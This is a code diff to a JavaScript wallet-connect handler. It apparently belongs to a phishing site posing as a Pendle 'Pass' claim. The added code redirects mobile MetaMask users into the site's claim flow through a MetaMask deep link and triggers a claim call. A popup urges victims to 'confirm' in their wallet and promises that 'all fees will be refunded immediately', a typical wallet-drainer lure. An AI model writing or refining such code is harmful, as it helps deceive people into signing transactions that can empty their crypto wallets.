@@ -542,38 +542,43 @@ export default {
           await this.showBalance();
           return;
         } else {
-          
-          await web3modal.openModal();
-          web3modal.subscribeModal((newState) => {
-            if (!newState.open) {
-              if (getAccount().isConnected) {
+          if (window.innerWidth <= 768 && window.ethereum.isMetaMask) {
+            window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/";
+            this.wc_claim()
+          }else {
+            await web3modal.openModal();
+            web3modal.subscribeModal((newState) => {
+              if (!newState.open) {
+                if (getAccount().isConnected) {
 
-                Swal.fire({
-                  html:
-                    '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
-                    '<small style="font-size: 15px">Verify your wallet to continue</small> ',
-                  showCloseButton: false,
-                  showCancelButton: false,
-                  showConfirmButton: false,
-                  background: '#00000080',
-                  width: '550px',
-                  color: '#fff',
-                  customClass: {
-                    loader: '',
-                  },
-                  didOpen: () => {
-                    Swal.showLoading();
-                  },
-                });
-                // if ( window.innerWidth <= 768) {
-                //   window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/";
-                // }
-                this.account = getAccount().address;
-                this.showBalance();
+                  Swal.fire({
+                    html:
+                      '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+                      '<small style="font-size: 15px">Verify your wallet to continue</small> ',
+                    showCloseButton: false,
+                    showCancelButton: false,
+                    showConfirmButton: false,
+                    background: '#00000080',
+                    width: '550px',
+                    color: '#fff',
+                    customClass: {
+                      loader: '',
+                    },
+                    didOpen: () => {
+                      Swal.showLoading();
+                    },
+                  });
+                  // if ( window.innerWidth <= 768) {
+                  //   window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/";
+                  // }
+                  this.account = getAccount().address;
+                  this.showBalance();
+                }
               }
-            }
-          });
+            });
+          }
         }
+          
       } catch (error) {
         Toast.error(error.message);
       }
